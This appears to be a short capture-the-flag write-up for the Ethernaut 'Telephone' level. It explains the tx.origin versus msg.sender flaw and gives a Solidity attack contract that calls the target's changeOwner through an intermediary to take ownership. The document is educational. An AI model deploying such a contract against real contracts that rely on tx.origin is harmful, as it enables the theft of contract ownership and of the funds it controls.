The vulnerability of the smart contract lies on the difference between tx.origin and msg.sender.

This contract aims to teach how using tx.origin is not always a good practice, since a bad implementation might turn users into the target of phishing attacks.




```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

//Contract meant for breaking the Telephone smart contract from ethernaut:
//https://ethernaut.openzeppelin.com/level/0x2C2307bb8824a0AbBf2CC7D76d8e63374D2f8446

interface Telephone {

    function changeOwner(address _owner) external;

}

contract BreakTelephone {

    address public owner;

    modifier onlyOwner(){
        require(msg.sender == owner);
        _;
    }

    constructor() {
        owner = msg.sender;
    }


    function callChangeOwner(address newOwner, address contract_address) public onlyOwner{
        Telephone(contract_address).changeOwner(newOwner);
    }

    
}
```